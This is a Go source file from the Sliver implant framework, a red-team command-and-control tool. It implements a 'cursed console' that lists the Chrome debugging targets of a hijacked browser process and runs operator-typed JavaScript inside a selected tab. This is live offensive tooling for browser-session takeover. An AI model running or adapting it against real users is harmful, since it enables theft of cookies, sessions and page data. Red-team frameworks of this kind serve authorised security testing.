package cursed

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"bytes"
	"fmt"
	"os"
	"strings"
	"text/tabwriter"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/overlord"
	"github.com/desertbit/grumble"
)

func CursedConsoleCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	curse := selectCursedProcess(con)
	if curse == nil {
		return
	}
	con.Println()
	con.PrintInfof("Querying debug targets ... ")
	targets, err := overlord.QueryDebugTargets(curse.DebugURL().String())
	con.Printf(console.Clearln + "\r")
	if err != nil {
		con.PrintErrorf("Failed to query debug targets: %s\n", err)
		return
	}
	target := selectDebugTarget(targets, con)
	if target == nil {
		return
	}
	con.PrintInfof("Connecting to '%s', use 'exit' to return ... \n", target.Title)
	startCursedConsole(curse, target, con)
}

func selectDebugTarget(targets []overlord.ChromeDebugTarget, con *console.SliverConsoleClient) *overlord.ChromeDebugTarget {
	if len(targets) < 1 {
		con.PrintErrorf("No debug targets\n")
		return nil
	}

	id2target := map[string]overlord.ChromeDebugTarget{}
	outputBuf := bytes.NewBufferString("")
	table := tabwriter.NewWriter(outputBuf, 0, 2, 2, ' ', 0)
	for _, target := range targets {
		fmt.Fprintf(table, "%s\t%s\t%s\n", target.ID, target.Title, target.URL)
		id2target[target.ID] = target
	}
	table.Flush()
	options := strings.Split(outputBuf.String(), "\n")
	options = options[:len(options)-1] // Remove the last empty option
	prompt := &survey.Select{
		Message: "Select a debug target:",
		Options: options,
	}
	selected := ""
	err := survey.AskOne(prompt, &selected)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return nil
	}
	if selected == "" {
		return nil
	}
	selectedID := strings.Split(selected, " ")[0]
	selectedTarget := id2target[selectedID]
	return &selectedTarget
}

func startCursedConsole(curse *core.CursedProcess, target *overlord.ChromeDebugTarget, con *console.SliverConsoleClient) {
	reader := bufio.NewReader(os.Stdin)
	text := getLine(reader, con)
	for ; shouldContinue(text); text = getLine(reader, con) {
		ctx, _, _ := overlord.GetChromeContext(target.WebSocketDebuggerURL, curse)
		result, err := overlord.ExecuteJS(ctx, target.WebSocketDebuggerURL, target.ID, text)
		if err != nil {
			con.PrintErrorf("%s\n", err)
		}
		con.Println()
		con.Printf("%s", result)
		con.Println()
	}
}

func getLine(r *bufio.Reader, con *console.SliverConsoleClient) string {
	con.Printf(console.Clearln + "\rcursed-console > ")
	t, _ := r.ReadString('\n')
	return strings.TrimSpace(t)
}

func shouldContinue(text string) bool {
	if strings.EqualFold("exit", text) {
		return false
	}
	return true
}
